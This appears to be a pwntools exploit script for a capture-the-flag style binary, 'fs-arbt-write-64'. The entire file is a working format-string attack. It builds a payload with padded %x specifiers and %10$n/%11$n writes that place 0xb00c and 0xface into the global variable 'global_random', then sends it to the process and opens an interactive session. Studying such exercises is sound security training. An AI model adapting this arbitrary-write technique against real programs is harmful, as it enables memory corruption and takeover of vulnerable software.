#!/usr/bin/env python

from pwn import *
import os

p = process("./fs-arbt-write-64")
#context.terminal = ['tmux','splitw','-h']
#gdb.attach(p)

target_gv = p.elf.symbols['global_random']
#print(hex(target_gv))
#addr1 = 0x804a048 #0xb00c
#addr2 = 0x804a04a #0xface
t2 = target_gv + 2
#print(hex(t2))

print(p.recv())
first = 0xb00c
second = 0xface - 0xb00c
#print(first)
print(hex(second))

while second < 0:
    second += 0x10000

buf = "%" + "%05d" % first + "x"
buf += "%10$n"
#buf += "AAAA"
buf += "%" + "%05d" % second + "x"
buf += "%11$n"
buf += "AAAAAAAA"
buf += p64(target_gv) + p64(t2)
print(buf)

p.sendline(buf)
p.interactive()

